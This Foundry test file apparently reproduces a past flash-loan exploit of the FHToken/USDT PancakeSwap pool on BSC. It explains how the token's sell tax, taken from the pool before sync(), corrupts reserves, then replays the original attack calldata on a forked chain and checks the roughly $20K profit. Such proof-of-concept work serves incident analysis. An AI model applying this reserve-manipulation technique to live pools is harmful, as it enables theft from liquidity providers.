// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// FHToken (FH/USDT PancakeSwap V2) — deflationary sell-tax token burns/redistributes from the
// POOL's own balance and calls sync() before the seller's net tokens land — BSC.
// Attacker net profit ~19,999.02 USDT (~$20K) in a single flash-loan-funded tx.
//
// Exploit tx   : 0x7a3cadc2f33e000b0091307df62db2f5cc79ab8e0b022fd84de9e1c2c0745bd2 (block 117979402)
// Attacker EOA : 0x7FA3bC0d5667fFd14d7ACD6Ce5f2432AC13a6FDA (nonce 4; tx.origin == msg.sender)
// Attack ctrt  : 0x727Fb666E3F2531e807E987532C6e2C22ADC45aD (deployed in an EARLIER block, already
//                on-chain at exploit block-1; entry selector 0x65ac0565)
// Victim pool  : 0x8f2d1A3992856a860304f1B86534B6B129Cc4df7 (PancakeSwap V2 FH/USDT pair)
// FHToken      : 0xdCf0DFe0053677A67610c6d08EA1f5c78DF8cA37 (the vulnerable token)
//
// Protocol addresses touched:
//   USDT (BSC BEP20) : 0x55d398326f99059fF775485246999027B3197955 (pair token0)
//   Pancake Router   : 0x10ED43C718714eb63d5aA57B78B54704E256024E (V2)
//   Flash-loan src   : 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C (Lista/Moolah proxy, USDT flashLoan)
//   FH sell-fee sinks: 0x000...dEaD (burn), 0x36ac7a082237fBfee9847cc4A56Bf7d49ead90C5 (redistribute)
//
// Root cause (reproducible contract mechanism, verified against the on-chain trace, NOT a
// key/signer/privileged-claim compromise). BscScan verified source was not retrievable without an
// API key, so the mechanism below is confirmed from the decoded execution trace, which is decisive:
//
//   FHToken._transfer treats a transfer INTO the pair as a "sell". On a sell it does not tax the
//   SELLER's amount — instead it burns 80% and redistributes 20% out of the POOL's OWN FH balance,
//   and then calls pair.sync() BEFORE the seller's net FH has been credited to the pair. sync()
//   therefore latches reserve1 (FH) far below the pair's true post-transfer FH balance. Pancake's
//   constant-product swap then values the sell against that shrunken FH reserve and overpays USDT.
//
// Trace evidence for one sell leg (18-decimal; USDT is token0, FH is token1):
//   pair FH balance before the sell transferFrom : 100,627.665 FH
//     - Transfer pair -> dead        71,746.826 FH  (80% burn, taken from the POOL)
//     - Transfer pair -> 0x36ac7a..  17,936.706 FH  (20% redistribute, taken from the POOL)
//     - pair.sync() reads FH balance 10,944.132 and latches reserve1 = 10,944.132
//     - Transfer attacker -> pair    89,683.532 FH  (seller's net, credited AFTER sync)
//   Router then swaps against reserves (39,799 USDT, 10,944 FH) while the pair actually holds
//   ~100,627 FH, so it pays out 35,460.85 USDT for FH that cost ~19,799 USDT to buy.
//
// The attack contract loops this 25 times (the 6th calldata arg): each cycle buys ~99% of the
// pair's USDT reserve worth of FH, then sells it back to drain USDT at the corrupted reserve.
//
// Full self-contained single tx. Attack contract entry (0x65ac0565):
//   1. flashLoan 25,999.35 USDT from the Lista/Moolah pool.
//   2. onMoolahFlashLoan: approve router, run 25 buy/sell cycles against the FH/USDT pair.
//   3. repay 25,999.35 USDT to the flash-loan source, forward 19,999.018 USDT profit to the EOA.
//
// flashLoan, router swaps, pair.swap/sync are all plain permissionless public calls (the trace
// shows an unprivileged contract calling them; no admin/owner/signer path). The attack contract
// already exists at block-1, so this PoC forks at block-1, pranks the attacker EOA as both
// msg.sender and tx.origin, and replays the EXACT original exploit calldata (hardcoded verbatim).
// No attack logic is reconstructed.
//
// The Lista/Moolah flashLoan impl uses transient storage, so the test runs on cancun. An inline
// forge-config on testExploit selects it, so the bare command below works with no extra flag.
//
// Run:
//   forge test --contracts ./src/test/2026-08/FHToken_exp.sol -vvv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract FHToken_exp is Test {
    address internal constant ATTACKER = 0x7FA3bC0d5667fFd14d7ACD6Ce5f2432AC13a6FDA;
    address internal constant ATTACK = 0x727Fb666E3F2531e807E987532C6e2C22ADC45aD;
    address internal constant POOL = 0x8f2d1A3992856a860304f1B86534B6B129Cc4df7;
    address internal constant FH = 0xdCf0DFe0053677A67610c6d08EA1f5c78DF8cA37;
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    // The foundry.toml "bsc" alias RPC does not serve archival state for this block, so the fork
    // is pinned to a working BSC archive endpoint directly, same pattern as the Atomic PoC.
    string internal constant BSC_ARCHIVE = "https://bsc-mainnet.public.blastapi.io";

    // Exact calldata of the original exploit tx (selector 0x65ac0565 + args), verbatim.
    // args: (FH, pool, USDT, flashAmount=25999.35e18, 9900 (bps of reserve per buy), 25 (loops),
    //        15999.214485242342824323e18)
    bytes internal constant EXPLOIT_CALLDATA =
        hex"65ac0565000000000000000000000000dcf0dfe0053677a67610c6d08ea1f5c78df8ca370000000000000000000000008f2d1a3992856a860304f1b86534b6b129cc4df700000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000000000000000000000000005816d76628a3c3f000000000000000000000000000000000000000000000000000000000000000026ac000000000000000000000000000000000000000000000000000000000000001900000000000000000000000000000000000000000000036351b426db4a045983";

    // Exact msg.value the attacker forwarded (0.00001 BNB).
    uint256 internal constant EXPLOIT_VALUE = 10_000_000_000_000;

    function setUp() public {
        // block-1: real protocol state immediately before the exploit tx executed.
        vm.createSelectFork(BSC_ARCHIVE, 117_979_401);
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public {
        uint256 before = USDT.balanceOf(ATTACKER);
        emit log_named_decimal_uint("attacker USDT before", before, 18);

        vm.deal(ATTACKER, EXPLOIT_VALUE);
        // Prank the attacker EOA as both msg.sender and tx.origin, matching the real trace.
        vm.prank(ATTACKER, ATTACKER);
        (bool ok,) = ATTACK.call{value: EXPLOIT_VALUE}(EXPLOIT_CALLDATA);
        require(ok, "exploit call failed");

        uint256 afterBal = USDT.balanceOf(ATTACKER);
        emit log_named_decimal_uint("attacker USDT after ", afterBal, 18);

        uint256 profit = afterBal - before;
        emit log_named_decimal_uint("attacker USDT profit", profit, 18);

        // Reported loss ~$20K. Traced net gain to the attacker EOA is 19,999.018106552928530404 USDT.
        assertEq(profit, 19_999_018_106_552_928_530_404, "profit != traced value");
        assertGe(profit, 19_000e18, "profit below ~$20K reported loss");
    }
}
